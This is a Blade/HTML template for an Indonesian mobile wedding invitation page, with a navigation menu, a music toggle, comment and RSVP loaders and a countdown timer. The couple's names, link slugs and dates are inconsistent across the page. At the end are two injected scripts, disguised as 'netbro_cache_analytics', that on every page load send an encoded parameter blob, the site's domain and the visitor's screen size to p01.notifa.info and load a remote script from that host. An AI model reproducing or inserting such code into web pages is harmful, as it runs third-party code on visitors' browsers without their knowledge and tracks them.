<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  
  <meta property="og:image" content="{{ asset('wedding-4/images/imagelink/13.jpg') }}"> 
  <meta property="og:title" content="Wedding of Aninda & Primus" />
  <meta property="og:description" content="Gedung SDELOG POLRI, 08 | 04 |2018.">
  <meta property="og:type" content="article" />   
  <meta property="og:url" content="anindaprimus"/>

  <link rel="shortcut icon" href="{{ asset('wedding-4/images/favicon.png') }}">
  <link href="{{ asset('wedding-4/images/apple_touch_icon_72x72.png') }}" media="(device-width: 320px)" rel="apple-touch-startup-image">
  <link href="{{ asset('wedding-4/images/apple_touch_icon_114x114.png') }}" media="(device-width: 320px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
  <title>Aninda & Primus Wedding - by halalindong.com</title>
  <link rel="stylesheet" href="{{ asset('wedding-4/css/framework7.css') }}">
  <link rel="stylesheet" href="{{ asset('wedding-4/css/style.css') }}">
  <link href="{{ asset('wedding-4/css/font-awesome.min.css') }}" rel="stylesheet">
  <link type="text/css" rel="stylesheet" href="{{ asset('wedding-4/css/swipebox.css') }}" />
  <link type="text/css" rel="stylesheet" href="{{ asset('wedding-4/css/animations.css') }}" />
  <link type="text/css" rel="stylesheet" href="{{ asset('wedding-4/css/custom.css') }}" />
  <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,900" rel="stylesheet">
</head>
<body id="mobile_wrap">

<div class="statusbar-overlay"></div>
<div class="panel-overlay"></div>


<div class="panel panel-left panel-reveal">
	<div class="view view-subnav">
  	    <div class="pages">
            <div data-page="panel-leftmenu" class="page pagepanel" style="background-color: #cfcec9;">	
                <div class="page-content">
    		    	<nav class="main-nav icons_21">
                        <ul >
                    
                           <li>
                                <a href="http://wd.halalindong.com/hanestyaricky/" class="close-panel" data-view=".view-main">
                                    <img src="{{ asset('wedding-4/images/icons/gold/home.png') }}" alt="" title="" />
                                    <span class="leftmenu_name">Home</span>
                                </a>
                            </li>
                        
                            <li>
                                <a href="http://wd.halalindong.com/hanestyaricky/couple" class="close-panel" data-view=".view-main">
                                    <img src="{{ asset('wedding-4/images/icons/gold/rings.png') }}" alt="" title="" />
                                    <span class="leftmenu_name">Mempelai</span>
                                </a>
                            </li>
                        
                            <li>
                                <a href="http://wd.halalindong.com/hanestyaricky/event" class="close-panel" data-view=".view-main">
                                    <img src="{{ asset('wedding-4/images/icons/gold/blog.png') }}" alt="" title="" />
                                    <span class="leftmenu_name">Acara</span>
                                </a>
                            </li>  
                    
                            <li>
                                <a href="http://wd.halalindong.com/hanestyaricky/gallery" class="close-panel" data-view=".view-main">
                                    <img src="{{ asset('wedding-4/images/icons/gold/photos.png') }}" alt="" title="" />
                                    <span class="leftmenu_name">Galeri</span>
                                </a>
                            </li>
                            
                            <li>
                                <a href="http://wd.halalindong.com/hanestyaricky/map" class="close-panel" data-view=".view-main">
                                    <img src="{{ asset('wedding-4/images/icons/gold/map.png') }}" alt="" title="" />
                                    <span class="leftmenu_name">Lokasi</span>
                                </a>
                            </li>
                        
                            <li>
                                <a href="http://wd.halalindong.com/hanestyaricky/quotes" class="close-panel" data-view=".view-main">
                                    <img src="{{ asset('wedding-4/images/icons/gold/quotes.png') }}" alt="" title="" />
                                    <span class="leftmenu_name">Quotes</span>
                                </a>
                            </li>
                        
                            <li>
                                <a href="http://wd.halalindong.com/hanestyaricky/says" class="close-panel" data-view=".view-main">
                                    <img src="{{ asset('wedding-4/images/icons/gold/message.png') }}" alt="" title="" />
                                    <span class="leftmenu_name">Ucapan</span>
                                </a>
                            </li>
                    
                            <li>
                                <a href="#" class="close-panel" data-view=".view-main">
                                    <img src="" alt="" title="" />
                                    <span class="leftmenu_name"></span>
                                </a>
                            </li>    
                        </ul>
    			    </nav>
                </div>
  		    </div>
  	    </div>
	</div>  
</div>
<div class="views"  >
    <div class="view view-main">
        <div class="pages" >
            
            @include('wedding-4.gallery')

    </div>
  </div>
</div>

<div class="music-box">
    <button class="music-box-toggle-btn">
        <!--
        <i class="fa fa-music"></i> -->
        <audio id='song' loop>
          <source src="http://wd.halalindong.com/assets/templates/mobile/music/piano_instrumental1.mp3">
        </audio>  

        <button type="button" class="music" id="mute-sound" >
          <i class="fa fa-music"></i>
        </button>
        <button type="button" class="music" id="unmute-sound" >
          <i class="fa fa-microphone-slash"></i>
        </button> 
    </button>
</div>

<!-- end music box -->

<script type="text/javascript" src="http://wd.halalindong.com/assets/templates/mobile/js/jquery-1.10.1.min.js"></script>


<script>
	document.getElementById('mute-sound').style.display = 'none';
  document.getElementById('unmute-sound').addEventListener('click', function(event){
    document.getElementById('unmute-sound').style.display = 'none';
    document.getElementById('mute-sound').style.display = 'inline-block';
    document.getElementById('song').play();
  });

  document.getElementById('mute-sound').addEventListener('click', function(event){
    document.getElementById('mute-sound').style.display = 'none';
    document.getElementById('unmute-sound').style.display = 'inline-block';
    document.getElementById('song').pause();
  });


</script>




    </div>
  </div>
    
  <script type="text/javascript" src="{{ asset('wedding-4/js/jquery-1.10.1.min.js') }}"></script>
  <script type="text/javascript" src="{{ asset('wedding-4/js/jquery.validate.min.js') }}" ></script>
  <script type="text/javascript" src="{{ asset('wedding-4/js/framework7.js') }}"></script>
  <script type="text/javascript" src="{{ asset('wedding-4/js/jquery.swipebox.js') }}"></script> 
  <script type="text/javascript" src="{{ asset('wedding-4/js/jquery.fitvids.js') }}"></script>
  <script type="text/javascript" src="{{ asset('wedding-4/js/email.js') }}"></script>
  <script type="text/javascript" src="{{ asset('wedding-4/js/audio.min.js') }}"></script>
  <script type="text/javascript" src="{{ asset('wedding-4/js/my-app.js') }}"></script>

  <script>
  function view_more() 
  {     
    //$('#comments').append(load(url));
    //$('#comments').append($('<li>').html('<img src="assets/images/loader.gif"   style="margin-top:5px; display: block; margin: 0 auto;"/>'));
    
    var start=document.getElementById("comment_start").value;
    var comment_start = parseInt(start) + 5;
    document.getElementById("comment_start").value = comment_start;

    //var url = 'http://wd.halalindong.com/hanestyaricky/says_more/'+ comment_start ;
    var url = 'http://wd.halalindong.com/hanestyaricky/says_more/'+ comment_start ;

    //alert(url);
    $('#comments').append($('<div>').load(url));
    return false;
  }
</script>

<script>
  function rsvp_more() 
  {     
    var start=document.getElementById("comment_start").value;
    var comment_start = parseInt(start) + 5;
    document.getElementById("comment_start").value = comment_start;

    var url = 'http://wd.halalindong.com/hanestyaricky/rsvp_more/'+ comment_start ;

    //alert(url);
    $('#comments').append($('<div>').load(url));
    return false;
  }
</script>


<script>
    function makeTimer() {

      var endTime = new Date("April 27, 2018 09:00:00 PDT");     
      var endTime = (Date.parse(endTime)) / 1000;

      var now = new Date();
      var now = (Date.parse(now) / 1000);

      var timeLeft = endTime - now;

      var days = Math.floor(timeLeft / 86400); 
      var hours = Math.floor((timeLeft - (days * 86400)) / 3600);
      var minutes = Math.floor((timeLeft - (days * 86400) - (hours * 3600 )) / 60);
      var seconds = Math.floor((timeLeft - (days * 86400) - (hours * 3600) - (minutes * 60)));

      if (hours < "10") { hours = "0" + hours; }
      if (minutes < "10") { minutes = "0" + minutes; }
      if (seconds < "10") { seconds = "0" + seconds; }

      $("#days").html(days + "<span>Days</span>");
      $("#hours").html(hours + "<span>Hours</span>");
      $("#minutes").html(minutes + "<span>Minutes</span>");
      $("#seconds").html(seconds + "<span>Seconds</span>");   
  }

  setInterval(function() { makeTimer(); }, 1000);
</script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m4AsOAl%2bDG5ffILjqNGoqiZVBqv%2fMysxuzQRe7na8BzbBrzyi4cs%2bEtSkZvtYNGqW3l%2fBFx8lPBRyVkzL3TtdL1LxuC4cx1ZtCTi7SqtZ6e3oZaNkhBpw8B2nIehV8qoudrqgGZlGEPMKEjFVlaw7TGr917IS2oYE8tqNMczZa4i5xdwukFAphfdNEx6JL5eF5UsYIAa2jb5VPokTwcxN4ny%2fC7rg9pNLkdXNG4An%2fwO3coC5DK8Cf3hTiP4bovu5J7kqqybEBN7mITtBQvNKeTjfSffFGLdlSjZs8xQAQsWEW1QgTvKULE4eWVmhvf97nkW5wTIkqCctgGPC0uR47NImFmCf%2bWVpbh90RZ0%2fq6vwbTcmegr1%2fnhFX7kXRM1htyhHLPiqccSVHdtasvh%2bBwMkUvK1wQ8OWmfiIsV%2bik1NBabMxSu8YbUaYtGVsVpI4fW1OdTHuyc0jasAWLpkJj8%2bY03ocrw%2fedT53bsI30RMm4LRGnLUBQNcgMwHpwUMvdTRAE8QUnuzTrtO2GK5GkChOlcvKkuX9NXQptu77dpQ8zXzUTI0LQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
  </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2GL9VkzwiM1GGoQ5Z6%2fy2oJA8g0wSssRobr3G8qaGTq7Q3u0H3jN30Mc8HvY9DT2MBPFA%2fPHgTtlNcPlHSTuYLVSg%2fkNP%2bLOE0RqWF7gsyWbC7%2b2z5eEpqhBUoEmlqg6TMQIHgPYKo8HFKQpaS6Y3Ar0AzIJ%2ffmf8UYDEXxi9ACtZifOdqxeRWhsMOpvpTppd145c0JR8ieQstXuZUVNSw%2bmw15En8sdBQF613GxBbeeEutvFlvbVX5Gfy%2fqCxxrGCp8VadJ5UMaM3M6ma4tDtZJVl1zpVEGVEje%2fPYU8WrhS%2blM4jk9skNHvV8pjUO8B5zEkslz6M%2b36BnnLabdHcjBZBQ9hBvmkXefGue3zAgX4vPTBVvxrxIirWO%2bhzsw85oLUfkJlmIOprGEp%2fsXypDE2MUmY66nlMKsRcmzpDuT%2fbpx7va3Rck9YRszuG9MvWf8nKzAe8S4TPo2TTzfdoHuS9slKm3zGEM1cIE5ZPnaLH3IXM0NTiw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>